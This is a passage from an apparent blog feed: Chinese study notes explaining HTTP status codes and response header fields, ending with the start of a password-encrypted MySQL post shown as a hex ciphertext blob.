<p>当客户端发起一次 HTTP请求后，服务器会返回一个包含 HTTP 状态码的信息头（server header ）用以响应客户端的请求。response 消息中的第一行叫作<strong>状态行</strong>，由 HTTP 协议<strong>版本号</strong>、<strong>状态码</strong>、<strong>状态消息</strong>三部分组成。</p>
<p>状态码用来告诉 HTTP 客户端 HTTP 服务器是否产生了预期的 response。</p>
<div class="note warning"><p>状态码<mark class="label danger">总共只有三位</mark>，<mark class="label danger">第一位</mark>表示状态类别，共分为<mark class="label success">五种</mark>。</p>
<ul>
<li><mark class="label primary">1xx</mark>：是进度通知类状态，意思就是说“请求我已经收到了，或你的请求我正在处理”。</li>
<li><mark class="label primary">2xx</mark>：表示“你的请求我已经成功处理了”。</li>
<li><mark class="label primary">3xx</mark>：即重定向，也就是服务器告诉客户端“你要的资源搬家了，你到某某地方再去找它吧”。</li>
<li><mark class="label primary">4xx</mark>：客户端发来的响应报文里有些<strong>错误</strong>，比如语法错误或请求的资源不存在等。</li>
<li><mark class="label primary">5xx</mark>：服务器端有些问题，已经无法处理完成你的请求了。</li>
</ul>
</div>

<p>常用的一些状态码如下：</p>
<ul>
<li><strong>200 OK</strong>：客户端，你的请求处理成功，你要的东西就在响应报文里了。</li>
<li><strong>301 Moved Permanently</strong>：客户端，你要请求的资源已经永久地搬家了，我把它的新地址放到了<code>Location</code>头部域中了。</li>
<li><strong>302 Moved Temporarily</strong>：客户端，你要请求的源临时有事去别的地方了，我把它的位置放到<code>Location</code>头部域中了，你可以先去那里找它.不过它应该会回到它原来的家的。</li>
<li><strong>304 Not Modified</strong>：客户端，你要请求的资源自从上次你请求之后，就再也没有改动过。我想你应该早就有这个资源了。所以在响应报文的数据部分我就没有再放这个资源。</li>
<li><strong>400 Bad Request</strong>客户端，你发来的请求报文里有语法情误，服务器端实在看不懂。 </li>
<li><strong>401 Unauthorized</strong>：客户端，你发来的请求不是合法来源的请求，你是没有被授权的客户端吧。 </li>
<li><strong>403 Forbidden</strong>：服务器端顺利收到了客户端的请求，但因为某些理由，服务器端拒绝为你提供服务。</li>
<li><strong>404 Not Found</strong>：客户端，你请求的资源不存在，八成是资源地址写错了。</li>
<li><strong>500 Internal Server Error</strong>：很遗憾，服务器不能给你提供服务了，服务器内部出现了不可预知的问题。</li>
<li><strong>502 Bad Gateway</strong>：客户端你好，我是请求报文的代理服务器，持有资源的那个服务器在给我发送资源时出问题了。</li>
<li><strong>503 Server Unavailable</strong>：服务器现在可能是太忙了，暂时不能给你这个客户端提供服务，或许稍后会恢复的。</li>
</ul>
<p>除了以上几个常用的状态码，还有许多其他含义的状态码。完整状态码含义表如下。</p>
<p>（1）<mark class="label warning">请求收到，继续处理</mark></p>
<table>
<thead>
<tr>
<th align="center">状态码</th>
<th>状态描述</th>
<th>状态说明</th>
</tr>
</thead>
<tbody><tr>
<td align="center">100</td>
<td>Continue</td>
<td>客户端必须继续发出请求</td>
</tr>
<tr>
<td align="center">101</td>
<td>Switching Protocols</td>
<td>客户端要求服务器根据请求转换 HTTP 协议版本</td>
</tr>
</tbody></table>
<p>（2）<mark class="label warning">成功响应，操作成功收到，分析、接受</mark></p>
<table>
<thead>
<tr>
<th align="center">状态码</th>
<th>状态描述</th>
<th>状态说明</th>
</tr>
</thead>
<tbody><tr>
<td align="center">200</td>
<td>OK</td>
<td>请求成功。一般用于GET与POST请求</td>
</tr>
<tr>
<td align="center">201</td>
<td>Created</td>
<td>已创建。成功请求并创建了新的资源。提示知道新文件的URL</td>
</tr>
<tr>
<td align="center">202</td>
<td>Accepted</td>
<td>已接受和处理，但处理未完成</td>
</tr>
<tr>
<td align="center">203</td>
<td>Non-Authoritative Information</td>
<td>非授权信息。请求成功。但返回的meta信息不在原始的服务器，而是一个副本<br/>返回信息不确定或不完整</td>
</tr>
<tr>
<td align="center">204</td>
<td>No Content</td>
<td>无内容。服务器成功处理，但未返回内容。但返回信息为空<br/>在未更新网页的情况下，可确保浏览器继续显示当前文档</td>
</tr>
<tr>
<td align="center">205</td>
<td>Reset Content</td>
<td>重置内容。服务器处理成功，用户终端（例如：浏览器）必须复位当前已经测览过的文件</td>
</tr>
<tr>
<td align="center">206</td>
<td>Partial Content</td>
<td>部分内容。服务器成功处理了部分 GET 请求</td>
</tr>
</tbody></table>
<p>（3）<mark class="label warning">重定向，完成此请求必须进一步处理</mark></p>
<table>
<thead>
<tr>
<th align="center">状态码</th>
<th>状态描述</th>
<th>状态说明</th>
</tr>
</thead>
<tbody><tr>
<td align="center">300</td>
<td>Multiple Choices</td>
<td>多种选择。请求的资源可在多处得到</td>
</tr>
<tr>
<td align="center">301</td>
<td>Moved Permanently</td>
<td>永久移动。请求的资源已被永久的移动到新 URI ，返回信息会包括新的 URI ，浏览器会自动定向到新 URI。<br/>今后任何新的请求都应使用新的 URI 代替</td>
</tr>
<tr>
<td align="center">302</td>
<td>Found</td>
<td>临时移动。与 301 类似。但资源只是临时被移动。客户端应继续使用原有 URI<br/>只有在<code>Cache-Control</code>或<code>Expires</code>中进行了指定的情况下，这个响应才是可缓存的</td>
</tr>
<tr>
<td align="center">303</td>
<td>See Other</td>
<td>查看其它地址。对应当前请求的响应可以在另一个 URI 上被找到，使用 GET 和 POST 请求查看<br/>这个方法的存在主要是为了允许由脚本激活的 POST 请求输出重定向到一个新的资源</td>
</tr>
<tr>
<td align="center">304</td>
<td>Not Modified</td>
<td>未修改。GET 所请求的资源未修改，服务器返回此状态码时，不会返回任何资源<br/>304 响应禁止包含消息体，因此始终以消息头后的第一个空行结尾</td>
</tr>
<tr>
<td align="center">305</td>
<td>Use Proxy</td>
<td>使用代理。所请求的资源必须通过服务器指定的代理访问</td>
</tr>
<tr>
<td align="center">306</td>
<td>Unused</td>
<td>已经被废弃的HTTP状态码，前一版本 HTTP 中使用用的代码，现行版本中 HTTP 不再使用</td>
</tr>
<tr>
<td align="center">307</td>
<td>Temporary Redirect</td>
<td>临时重定向。与302类似。使用GET请求重定向。</td>
</tr>
</tbody></table>
<p>（4）<mark class="label warning">请求错误，请求包含一个错误语法或不能完成</mark></p>
<table>
<thead>
<tr>
<th align="center">状态码</th>
<th>状态描述</th>
<th>状态说明</th>
</tr>
</thead>
<tbody><tr>
<td align="center">400</td>
<td>Bad Request</td>
<td>错误请求，如语法错误</td>
</tr>
<tr>
<td align="center">401</td>
<td>Unauthorized</td>
<td>未授权，请求要求用户的身份认证</td>
</tr>
<tr>
<td align="center">401.1</td>
<td></td>
<td>未授权：登录失败</td>
</tr>
<tr>
<td align="center">401.2</td>
<td></td>
<td>未授权：服务器配置问题导致登录失败</td>
</tr>
<tr>
<td align="center">401.3</td>
<td></td>
<td>未授权：禁止访问资源，由于 ACL 对资源的限制而未获得授权。</td>
</tr>
<tr>
<td align="center">401.4</td>
<td></td>
<td>授权被筛选器拒绝</td>
</tr>
<tr>
<td align="center">401.5</td>
<td></td>
<td>未授权：ISAPI 或 CGl 授权失败</td>
</tr>
<tr>
<td align="center">401.7</td>
<td></td>
<td>访问被 Web 服务器上的 URL 授权策略拒绝。这个错误代码为 IIS 6.0 所专用。</td>
</tr>
<tr>
<td align="center">402</td>
<td>Payment Required</td>
<td>保留，将来使用</td>
</tr>
<tr>
<td align="center">403</td>
<td>Forbidden</td>
<td>服务器理解请求客户端的请求，但是拒绝执行此请求</td>
</tr>
<tr>
<td align="center">403.1</td>
<td></td>
<td>禁止可执行访问</td>
</tr>
<tr>
<td align="center">403.2</td>
<td></td>
<td>禁止读访问</td>
</tr>
<tr>
<td align="center">403.3</td>
<td></td>
<td>禁止写访问</td>
</tr>
<tr>
<td align="center">403.4</td>
<td></td>
<td>禁止访问：要求SSL</td>
</tr>
<tr>
<td align="center">403.5</td>
<td></td>
<td>禁止访问：要求SSL128</td>
</tr>
<tr>
<td align="center">403.6</td>
<td></td>
<td>禁止访问：IP地址被拒绝</td>
</tr>
<tr>
<td align="center">403.7</td>
<td></td>
<td>禁止访问：要求客户证书</td>
</tr>
<tr>
<td align="center">403.8</td>
<td></td>
<td>禁止访问：禁止站点访问</td>
</tr>
<tr>
<td align="center">403.9</td>
<td></td>
<td>禁止访问：连接的用户过多</td>
</tr>
<tr>
<td align="center">403.10</td>
<td></td>
<td>禁止访问：配置无效</td>
</tr>
<tr>
<td align="center">403.11</td>
<td></td>
<td>禁止访问：密码更改</td>
</tr>
<tr>
<td align="center">403.12</td>
<td></td>
<td>禁止访问：映射器拒绝访问</td>
</tr>
<tr>
<td align="center">403.13</td>
<td></td>
<td>禁止访问：客户证书已被吊销</td>
</tr>
<tr>
<td align="center">403.14</td>
<td></td>
<td>禁止访问：Web 服务器被配置不列出此目录的内容</td>
</tr>
<tr>
<td align="center">403.15</td>
<td></td>
<td>禁止访问：客户访问许可过多</td>
</tr>
<tr>
<td align="center">403.16</td>
<td></td>
<td>禁止访问：客户证书不可信或者无效</td>
</tr>
<tr>
<td align="center">403.17</td>
<td></td>
<td>禁止访问：客户证书已经到期或者尚未生效</td>
</tr>
<tr>
<td align="center">403.18</td>
<td></td>
<td>客户端证书已过期或尚未生效。</td>
</tr>
<tr>
<td align="center">403.19</td>
<td></td>
<td>不能为这个应用程序池中的客户端执行 CGI。这个错误代码为 IIS 6.0 所专用。</td>
</tr>
<tr>
<td align="center">403.20</td>
<td></td>
<td>Passport 登录失败。这个错误代码为 IIS 6.0 所专用。</td>
</tr>
<tr>
<td align="center">404</td>
<td>Not Found</td>
<td>服务器无法根据客户端的请求找到资源（网页）。没有发现文件、 查询或URI</td>
</tr>
<tr>
<td align="center">405</td>
<td>Method Not Allowed</td>
<td>客户端请求中的方法被禁止。用户在<code>Request-Line</code>字段定义的方法不允许</td>
</tr>
<tr>
<td align="center">406</td>
<td>Not Acceptable</td>
<td>无法接受用户发送的请求，请求资源不可被访问</td>
</tr>
<tr>
<td align="center">407</td>
<td>Proxy Authentication Required</td>
<td>请求要求代理的身份认证，与401类似，但请求者应当使用代理进行授权</td>
</tr>
<tr>
<td align="center">408</td>
<td>Request Time-out</td>
<td>客户端没有在用户指定的时间内完成请求，超时</td>
</tr>
<tr>
<td align="center">409</td>
<td>Conflict</td>
<td>由于和被请求的资源的当前状态之间存在冲突，请求无法完成。</td>
</tr>
<tr>
<td align="center">410</td>
<td>Gone</td>
<td>客户端请求的资源已经不存在。<br/>410不同于404，如果资源以前有现在被永久删除了可使用410代码，网站设计人员可通过301代码指定资源的新位置</td>
</tr>
<tr>
<td align="center">411</td>
<td>Length Required</td>
<td>服务器无法处理客户端发送的不带Content-Length的请求信息</td>
</tr>
<tr>
<td align="center">412</td>
<td>Precondition Failed</td>
<td>一个或多个请求头字段在当前请求中错误</td>
</tr>
<tr>
<td align="center">413</td>
<td>Request Entity Too Large</td>
<td>请求的资源大于服务器允许的大小，服务器无法处理，因此拒绝请求。</td>
</tr>
<tr>
<td align="center">414</td>
<td>Request-URI Too Large</td>
<td>请求的 URI 过长（ URI 通常为网址），服务器无法处理</td>
</tr>
<tr>
<td align="center">415</td>
<td>Unsupported Media Type</td>
<td>服务器无法处理请求附带的媒体格式，请求资源不支持请求项目格式</td>
</tr>
<tr>
<td align="center">416</td>
<td>Requested range not satisfiable</td>
<td>客户端请求的范围无效</td>
</tr>
<tr>
<td align="center">417</td>
<td>Expectation Failed</td>
<td>服务器无法满足 Expect 的请求头信息</td>
</tr>
</tbody></table>
<p>（5）<mark class="label warning">服务端响应</mark></p>
<table>
<thead>
<tr>
<th align="center">状态码</th>
<th>状态描述</th>
<th>状态说明</th>
</tr>
</thead>
<tbody><tr>
<td align="center">500</td>
<td>Internal Server Error</td>
<td>服务器内部错误，无法完成请求</td>
</tr>
<tr>
<td align="center">500.11</td>
<td></td>
<td>服务器关闭</td>
</tr>
<tr>
<td align="center">500.12</td>
<td></td>
<td>应用程序重新启动</td>
</tr>
<tr>
<td align="center">500.13</td>
<td></td>
<td>服务器太忙</td>
</tr>
<tr>
<td align="center">500.14</td>
<td></td>
<td>应用程序无效</td>
</tr>
<tr>
<td align="center">500.15</td>
<td></td>
<td>不允许请求</td>
</tr>
<tr>
<td align="center">501</td>
<td>Not Implemented</td>
<td>服务器不支持请求的功能，无法完成请求</td>
</tr>
<tr>
<td align="center">502</td>
<td>Bad Gateway</td>
<td>网关错误。<br/>作为网关或者代理工作的服务器尝试执行请求时，从远程服务器接收到了一个无效的响应</td>
</tr>
<tr>
<td align="center">503</td>
<td>Service Unavailable</td>
<td>由于超载或系统维护，服务器暂时的无法处理客户端的请求。<br/>延时的长度可包含在服务器的Retry-After头信息中</td>
</tr>
<tr>
<td align="center">504</td>
<td>Gateway Time-out</td>
<td>充当网关或代理的服务器，未及时从远端服务器获取请求</td>
</tr>
<tr>
<td align="center">505</td>
<td>HTTP Version not supported</td>
<td>服务器不支持请求的HTTP协议的版本，无法完成处理</td>
</tr>
</tbody></table>
<ul>
<li><a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Status">HTTP 响应代码</a></li>
<li><a href="https://www.runoob.com/http/http-status-codes.html">HTTP状态码</a></li>
<li><a href="https://blog.csdn.net/dufufd/article/details/53112184">常见的HTTP状态码(HTTP Status Code)说明</a></li>
<li><a href="https://tool.oschina.net/commons?type=5">HTTP状态码详解</a></li>
</ul>
<h5 id="2-4-3-响应头"><a href="#2-4-3-响应头" class="headerlink" title="2.4.3 响应头"></a>2.4.3 响应头</h5><p><strong>一、Cache 头域</strong></p>
<table>
<thead>
<tr>
<th>Cache字段名称</th>
<th>字段值说明</th>
</tr>
</thead>
<tbody><tr>
<td><strong>Cache-Concrol</strong></td>
<td>缓存内容，上一节已说明。</td>
</tr>
<tr>
<td><strong>Date</strong></td>
<td>生成消息的具体时间和日期。</td>
</tr>
<tr>
<td><strong>Expires</strong></td>
<td>浏览器会制定过期时间内使用本地缓存。格林尼治时间 GMT。</td>
</tr>
<tr>
<td><strong>Pragma</strong></td>
<td>浏览内容不会被缓存</td>
</tr>
</tbody></table>
<p><strong>二、Cookie&#x2F;Login 头域</strong></p>
<table>
<thead>
<tr>
<th>Cookie字段名称</th>
<th>字段值说明</th>
</tr>
</thead>
<tbody><tr>
<td><strong>P3P</strong></td>
<td>用于跨域设置 Cookie，这样可以解决<code>iframe</code>跨域访问 Cookie 的问题。</td>
</tr>
<tr>
<td><strong>Set-Cookie</strong></td>
<td>用于把 Cookie 发送到客户端浏览器，每一个写入 Cookie 都会生成个<code>Set-Cookie</code></td>
</tr>
</tbody></table>
<p><strong>三、Entity 头域</strong></p>
<table>
<thead>
<tr>
<th>Entity字段名称</th>
<th>字段值说明</th>
</tr>
</thead>
<tbody><tr>
<td><strong>ETag</strong></td>
<td>和<code>If-None-Match</code>配合使用。</td>
</tr>
<tr>
<td><strong>Last-Modified</strong></td>
<td>用于指示资源的最后修改日期和时间。</td>
</tr>
<tr>
<td><strong>Content-Type</strong></td>
<td>Web服务器告诉浏览器自己响应的对象的类型和字符集。</td>
</tr>
<tr>
<td><strong>Content-Length</strong></td>
<td>指明实体正文的长度，以字节方式存储的十进制数字来表示。</td>
</tr>
<tr>
<td><strong>Content-Encoding</strong></td>
<td>Web服务器表明自己使用了什么压缩方法( gzip, deflate )压缩响应中的对象。</td>
</tr>
<tr>
<td><strong>Content-Language</strong></td>
<td>Web服务器告诉浏览器自己响应的对象的语言。</td>
</tr>
</tbody></table>
<p><strong>四、Miscellaneous 头域</strong></p>
<table>
<thead>
<tr>
<th>Miscellaneous字段名称</th>
<th>字段值说明</th>
</tr>
</thead>
<tbody><tr>
<td>Server</td>
<td>指明 HTTP 服务器的软件信息。</td>
</tr>
<tr>
<td>X-AspNet-Version</td>
<td>如果网站是用<code>ASP.NET</code>开发的，这个<code>header</code>用来表示<code>ASP.NET</code>的版本。</td>
</tr>
<tr>
<td>X-Powered-By</td>
<td>表示网站是用什么技术开发的。</td>
</tr>
</tbody></table>
<p><strong>五、Transport 头域</strong></p>
<table>
<thead>
<tr>
<th>Transport字段名称</th>
<th>字段值说明</th>
</tr>
</thead>
<tbody><tr>
<td><strong>Connection: keep-alive</strong></td>
<td>当一个网页打开完成后，客户端和服务器之间用于传输 HTTP 数据的 TCP 连接不会关闭<br/>如果客户端再次访问这个服务器上的网页，会继续使用这一条已经建立的连接</td>
</tr>
<tr>
<td><strong>Connection: close</strong></td>
<td>代表一个 request 完成后，客户端和服务器之间用于传输 HTTP 数据的 TCP 连接会关闭<br/>当客户端再次发送 Request 时，需要重新建立 TCP 连接。</td>
</tr>
</tbody></table>
<p>一个传输层的实际环流，它是建立在两个相互通信的应用程序之间。</p>
<p>在 HTTP1.1,中，<code>request</code>和<code>response</code>头中都有可能出现个<code>Connection</code>的头，此<code>header</code>的含义是当 Client 和 Server 通信时对于长连接如何进行处理。</p>
<div class="note primary"><ul>
<li>HTTP&#x2F;1.0，Connection: close</li>
<li>HTTP&#x2F;1.1，Connection: keep-alive</li>
<li>HTTP TCP，无状态，面向连接。</li>
<li>HTTP UDP，无状态，无连接</li>
</ul>
<p>HTTP 的无状态和<code>Connection: keep-alive</code>是两个不同的概念。无状态是指协议对于事务处理没有记忆，服务器不知道客户端是什么状态。也就是说，打开一个服务器上的网页和之前打开这个服务器上的网页之间没有任何联系，所以出现了 <strong>Cookie、Session等来解决无状态</strong>的问题。</p>
<p>keep-alive 不会永久保持，它有一个保持时间。</p>
</div>

<p><strong>六、Location 头域</strong></p>
<p>用于重定向一个新的位置，包含新的 URL 地址。</p>
<p><strong>七、Security 头域</strong></p>
<p>Strict-Transport-Security: max-age-31536000</p>
<p>网站通过 HTTP Strict Transport Security (HSTS ) 通知浏览器，这个网站禁止使用 HTTP 方式加载，浏览器应该自动把所有尝试使用 HTTP 的请求自动替换为 HTTPS 请求。</p>
<p>当你的网站第一次发送 HTTPS 请求，服务器响应<code>Strict-Transport-Security</code>头，浏览器记录下这些信息。然后后面尝试访问这个网站的请求都会自动把 HTTP 替换为 HTTPS 。当 HTTPS 头设置的过期时间到了，后面通过HTTP 的访问恢复到正常模式，不会再自动跳转到 HTTPS。每次浏览器接收到<code>Strict-Transport-Security</code>头，它都会更新这个网站的过期时间，所以网站可以刷新这些信息，防止过期发生。</p>
<p>会话保持、长连接、短链接：</p>
<ul>
<li><a href="https://cloud.tencent.com/document/product/214/6154">文档中心 &gt; 负载均衡 &gt; 负载均衡监听器 &gt; 会话保持</a></li>
<li><a href="https://zhuanlan.zhihu.com/p/32943807">负载均衡之TCP会话保持（一）</a></li>
<li><a href="https://blog.csdn.net/dshf_1/article/details/89336750">负载均衡的会话保持和长短连接简介</a></li>
<li><a href="https://blog.csdn.net/qq_31812703/article/details/79082542">会话的长连接与短连接详解</a></li>
</ul>
<p>关于同源策略：</p>
<ul>
<li><a href="https://www.cnblogs.com/laixiangran/p/9064769.html">浏览器同源策略及跨域的解决方法</a></li>
<li><a href="https://www.cnblogs.com/xhz-dalalala/p/5259965.html">同源策略和跨域-总结</a></li>
</ul>
]]></content>
      <categories>
        <category>笔记</category>
        <category>软件测试</category>
      </categories>
      <tags>
        <tag>知识笔记</tag>
      </tags>
  </entry>
  <entry>
    <title>MySQL入门</title>
    <url>/post/MySQL-Primer/</url>
    <content><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <script id="hbeData" type="hbeData" data-hmacdigest="d453030e0db996b626430279bfebc4f8ef7e6f10b7e2dd9ec8f27ebc121ba083">f2cb6dad3997b265c98f36a97452129c21cf4e999a6cbc8b467af22ef03282a61ddc3a5aa664420b20ef1b4451dd1ab3679af4f33647458713c294746dc01aa7e812cfc89828e514d7900844ebce9c02c517ee49710c486c82939ec4587a1fa4dcf9fdbe32b9774ff60e22120a8229b99fb234402108f6791dd20f80839c3efae96de9402c10af7190b416918b198ea748085e145a1113f92e025453376294d9d002b2894af1bdbe0951b290245e3d827b49ee27148e25c1874793cd683f34138f4e88376457df715116fa38fbd91077657caffe4af297e63f91be952f59af4929458d25267b415ec14bc974995d95b3bbc3785d3b6b812f6343f585946dec03070d42dc5e11ceaf4acd2cd0a67e5bce58c9c4bfb1800a3a62abd22c5646b2eb1c22fb1d2db2afdf13af91b494d072ee74f02946d5ddc9f41361fa7798ef564fcd19a47bfe7ff58c366a103f21c94c7d96f22ac449def2600402e618dff1d9b008faac59588c24c3609f252c07ebe500b8a26f525895704c12ada70a1bf69d063f13061373d12241b28eb1827519d4aa7ab6b2a81b5331398a9f0a9ecbd479479633b2aa00582e2eb03748c2a826f8ec328d1481eb16b0ed56cae90b5f2c3440958d6e26afdc8af053e860e2d388131913a198b26845242109154e2949a292bc5532c81713afbe0172fb6fba6af42625802f12fd4ac16a09bc17f006712f59fbba21e72bf2e07e38e2be1c58ca5e8dbd6b3d261e25501b823cbaf02834293053d98b71d216c83b653fcb19a4feaf004fad523cc45610d41b58c6e30580c556e048f43c2f61d03dafdd6d36ff4207cef172f2bfabbbab1ca653893aede17315fe0d8aaf5aa9e9addcd5bc9d34c0033dc7f4e76606ab52102380dc52f6d03c507d60a981805e4015a8934b02e8af5b8cbdaeafc7290a64d2716970b27f316763976ad5d3c1ba84beff10bfd27eb2645170e32a45f6aa55a25241a06003bc827b29003cb9b6efeee7c2f064e0823c179feffbc109f3b81a1c3631c79fddd93077bfcf3e443306fe91494cc2b34accd18e7d3e94f67ef1cd74b73789082bfd348962b7e7ad9fc10cf4c0ec4b72ba1fdc3cfd74e00f93f505134be7ba2c366d623be48a92c855c9b954387dda8a2095b0c55820572109203309f0eddd4c6da64acec0b373ea77948d4b5a6532b7bce335768289ddc0c8f9c374008bc2cb1e60f94b4a7d95c3c844f0bdb4528342d988fd554d068e82219764b1c0b3c737aec9b37005fbb2f4166ef4e9ee2864684ebf965e4e7c8901a1dcbbc0d03d693300863310e8407eb2327a35cd5dca3619e21b8683bb0e9605125647f78817668a9d26c2ebe0117c5d46d0828816ac3f2860177c815331d8983bf6925559dd25525a8b694c7fbfe44fc9b09a65ec4843012798330b334c53dfdcbd37dfc350c88580b06485ff025dbfc656e9313755b3ac81334dc192af3d4bf6eaf7c5c5ab035bcb9d36b34919a3dd533d55753d626c4babafd1f537eb1a77b2b267aeeac910144b07571b12c284ae83d9206238c3aa6b8697b35e2c488dfb40626b4122adfa5e6466d0b5a8c1f050a6973ca294090549fd752ba0172a614e35fcf560366018a9690bad00058ac45f40e905c26a0ce149e12e26fb4771f43899a53f8681c5c2babf8d2a6c7de688590138181a8fa335e2204df8f2c6b420d594392d85e0091618e4b8d8e24d3e6276f1345558829135344d18d9304673cffeaaa83e11a27d2b97a3b0cb04d9114eb08ad3c9576f6fdad3a69a180d1edd0a64961bd5d1b67f4069bf02695ff520def3864ea05578b5b7ed0cfc58d198321897c4638045f8c12edce99c743b209c7471090cc07dc98328b0cceb3c9d12cfd4d1111e9a0e720a231b16ef8aa4013a0e5c27ffce90d52d42fa6a26e10a9cd7c786193eeebb5e48498dd861c6524d19ab7fbe4cf577e2b2210441b9f8fae016c3312b64a8ce279a74ae134b1cabbcf108487d03efb5925acc0eba424784630b9e2244da3579c5c7b857a984745df78dd38545c8b1a37f1527a34218ebd25287ffdf03821874820575b81c6caa3ee856018b8155f4a661862c93ddcd40c441ba60b5a0fe5761efbef240f83ec8b21a4df25a49eba3ec5edaae267478fcb32b0b05ae022426b46e70f82142be7245a606f2915da45edce5b6d6c4fdb3d0cca9c46196618711011cd39c63ea9cdd64d01b97ab80863681c40897ff5931d18eb7ee5eb9cca4be9ae9ed1dab8bde65727d781b676a09c3d2cf8e2b0cdc601b82e3c6aae8829186df9d2ed8e16e41ec299d48e510dede6626f525f3924824296760efa0a333f41d58827cb61d57d34d0286872548a9148222959c40ab70eab1125205c32dba939ab841d9d93322d4b0954603d75008499158d45bd1d0986384a3a83eca66ba77c5b77bdb6e55a3b511d438f1ba5a8ca9bd8d9c5830bed75d259408cb3e9e555877051139f26ab3333927d292ccd3dca7f15e09fbae55c0e1256a454c882bf5b8b430d0d8898c538a9b95a08f992385943d20be0987326d6487d4636a924818f92294dff7495ae261432ecf5eb160bb4d2c139515aa841caf6142fbecc645e5b4073f8c805770f53c6d6b57ec77a3e2abde08f0d187f528a2df64f4636cb35b29f81c85c5a5ba2180c63155600976e4e300f7e9249a3c477b331fd62faa58784cd91db8006db9f0a9483576fe031e833110f4c5ccc36e57e8057ff0efc11399f71efa1bf4f5798ed380077c67bf86133c9ad045730c9b5ad3889a489d4b0ec68f87e7ac444965fcb56da2b94e146150ec522eabe0390b64a975448ec5da989064f5b35cbd6f1cc729cb31f66680a739ecec5669b627f7e165bee08767ef9fcabd4953825b7f4de168a9326e77c2b10686cb47c12e27e3a103b783a68ca9f35f98681df2a9b20a6a2652e8820e862d9bba55b9eb69e8f1881c50a331efb0cdba3541116aa0f0cfa9b67b8f960bdc6e073e16787e9421914f28398f523017b3c3b21c6dc3c79baf64f0f77efa634992f2f6d5a7f9c9075c35caf61a215aac296e98c6f985a468acbf3e58e6875242f34d8756abbb65758082e76ca6b8e60f5cdc37f8c352852194c4742f49a00f140ce02fa3030c6a3e10fe61529832aa66ddfabde3bf38cfb8f5c45c9a97f12a25cb59b2494ad043654fc5fcec824093bfebabd44ae5c9055a26020ab907fa06babb91ea0a5ffaf33ee651199467c761029ceb389a57ac7fd4fb53166b1b4382df787bb2b3dc06bbdba2db0e69fd9a2c4d9c2832a0a6c45d47dc53cee2d73a09220db5983c9b418518c1557fcde49c37ab852fb00e843b4e98a87c8b482c3d28c714719558da052f47d78004051c936d28752bc169d72784268dff70cd0758070e889bbb822d54e96651370b9cb954719e447b6e9a13b7ffff58681895d03d6afddfb22b405b08390615c1d50c4983656fda7e89cf42c55d8f0c5e8da36f7ede9068e083a038fb81b78398a98cd1af8adb92a8f4b03790e7d14d47aa15df9bb421d9da64d292efdba64cd53e8c27007e54619a429561b7a74e8a9292e6b3ffcf1bd09a59732324678f515bdb67b0c5e937eed0cef613855c63caddd9b9341c3abf30533d5cd0864d17de75b794a94798a7a1e90b4344f10e59b0631cb7e478b23b583ff08a6abbbebd3eeb26e127b22dba6bde42fa8ec384772b3a2bc91f7f333e5730b29793f1dc270b9635846f61decf45a28d112cc05f802d9f78e40b0b7e11dbfa07ffb784cc4d373949367d440c92144574e02f0339804a53dd6d619ac1697fe7c589cd82cf8760d2cc9b5ef9ebf21f83f61739caed9ae848e1e8857dc369ec20468997296b7f5862231822ea6344c4d9a85774daa77cd3d77aecb26225e58358a8eb826c969cb2ef90dc3d79423c5da9eea5b473601c46dceb68a58b607f22578c2807cbdc922500d8283dc6a57698c3205dd10c43bb84a70b88fd8dd3193ac6c523a9234833635f9c2b7398cced41cf8a266f1542158d1cf4743d4e3562f0abe59cd5270a604569b7a1f62b4c7df071781b3145c91e191ed1a1796f5c0ceb1644e280780200a62e001125a14e392c0356d6bb71a6ba721083fbdf79e10fa331309f44ea74ccf7446cb4b190fdc7946a797f9bbc5750f6a9ceb467a203d97f62dc789f5d72cdc41bcdcb43188cb2c996fa094b3a1b515bb6d4cf65b5fec9a1e56dbaa9d45967a0afe5efdbad0a3981241db6310fb815cf9257c56d68b64d6e107715f9b833111dd7f224ec1ce760384f043ba76097616177f89747fc3412cf58482e44c519b61003bf756aaf286f0fda03a0b60442538b27ae045b3bd12624ba611ee3eea383b06ae1940f4b4fa8e5fcac203b891feb837ae17dc66e7deb953e029c43fba083e9694c2cebc65b5f517669da840536a9048a51eed225c8b08740ee153c7760ef4dc5f96625cda699d4773026552bd91dd121a5d6ea6d5e2f672086c59f4a65aa28bbc1ccf4b66925bea1ffb729c1ad6b48d3aaa649a33451e669fb5a10b704b5768e2aeefec3d8b2d44641bf01a5c531df3ad968fbf1755d604ba89edd776491eabfe4930332122cbbc37d22488265672a9db4645f7ecc3ae9d22a98a327b2bbc40b570a3bcf25e20a6652d2f6eacb237ca95e2cf22d9b81a03b629d1abb1066b89013e3614142f491fd4f0fca773c185edc9e156fac1aad7416418369644deb43b3f6e22e7b0ce2bba7bc5682d05aea8888f784e372b0c4255792c3b017d5832a6c11cb89bd5166345177e715b4c20b14afe4bbc084599019123ad2bf49ef935b4b9a8c7ff9292fd30e8514f0c22bcaf2ce089b48ea917f792c88f18c3dc9cad1350fe5edf708a0c61515e4b262a0cb585a44c8c817cbc13ca8318da0f6edc1826fba57a672b2bf9fcc402d0a079b31f053d1541662a07d18f3899720ff909ee59482755633c22b88b818d6417526af0e2514c5d5f195a852560310a067ac401b9877a11f9679c95437630b76f9824f5f763d06e66d97be06fbc448dbc851ef15b9cba7896f18be97332e92e27e530e7bb389eb4c45aa783871b18006d52fb11b610535fccc187a56500aed004f9fe57b4cb8d2f9400f0939eeee53f74fc52e0843caed3f0f44bc8663ce75673136d047dfb988816ffb26ad724bc786036acfd9ed5eda76fd5f29a61fd2418a771a304d472a6b7fa479601ecdfd4c662919abbed12ca922528389709314387fa5a23a4ee4d89f968e6a875b4745007c723571eb47818ae97f6e7e2084ffc07a574fdf33843c4647db3d66aa1b6fad86afdfed902501a26f678fed7c541daff3ca1819fd4e5dc096b13bd86a5fa4051a148983ce1e6c23ccff8da3b4e7e273f67c6dd5cba3a192bd6e852641a0048259fdbcc1f83cf1b25573e10abb7052b502c06ff61001637d4c22b7b7c3dd87d1f569f45926d9dce95a9f6d1477fb28cff7d7d0fd3df93966c6f01ae51e70363ba5ffb0c822b743962940c2db85c67015bb6f9eec41cfebb2195ca27d0d4b8a05556a57e4c13b482208e9d0dbcd2b144206b3c7dc5ade35c82282fb7a5e2ba8b5db03e99ecaf9ebdbdaec6622464bad2e4a0712407e987a8fdb01d45cb6f1c46cd101c16bb0dc333f2f7ea2011bf3edeb62ca816de45b03ea9ebe831511bcd21a36ddd2088766e2ea6b4161921dc58f148ed9b3cb1f320908